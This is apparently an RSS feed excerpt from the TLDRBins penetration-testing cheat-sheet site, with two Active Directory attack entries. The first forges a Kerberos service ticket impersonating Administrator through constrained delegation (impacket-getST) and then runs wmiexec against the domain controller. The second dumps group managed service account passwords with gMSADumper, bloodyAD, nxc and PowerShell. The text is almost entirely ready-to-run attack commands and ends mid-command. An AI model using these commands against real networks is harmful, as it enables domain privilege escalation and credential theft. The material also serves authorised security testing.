channel.title: GMSADumper on TLDRBins
channel.description: Recent content in GMSADumper on TLDRBins

item.title: AllowedToDelegate
item.description: Privesc #1: Forge a Ticket Linux Windows 1. Get a service ticket # For example, spn: www/dc.example.com (Check Bloodhound) sudo ntpdate -s <DC> && impacket-getST -dc-ip <DC_IP> -spn <SERVICE>/<TARGET_DOMAIN> -hashes :<HASH> -impersonate Administrator '<DOMAIN>/<USER>' 2. Remote export KRB5CCNAME=Administrator.ccache sudo ntpdate -s <DC> && wmiexec.py -k -no-pass administrator@<DC> Note: impacket-wmiexec may not work 1. TO-DO TO-DO

item.title: ReadGMSAPassword
item.description: Abuse #1: Read GMSAPassword (From Linux) gMSADumper BloodyAD nxc python3 gMSADumper.py -u <USER> -p '<PASSWORD>' -l <DC> -d <DOMAIN> Ref: gMSADumper python3 bloodyAD.py -d <DOMAIN> -u <USER> -p '<PASSWORD>' --host <DC> get object <TARGET_OBJECT> --attr msDS-ManagedPassword Ref: bloodyAD nxc ldap -u <USER> -p '<PASSWORD>' -d <DOMAIN> <TARGET> --gmsa Abuse #2: Save as Cred Windows $gmsa = Get-ADServiceAccount -Identity <TARGET_NAME> -Properties 'msDS-ManagedPassword' $mp = $gmsa.'msDS-ManagedPassword' $password = (ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword $SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).
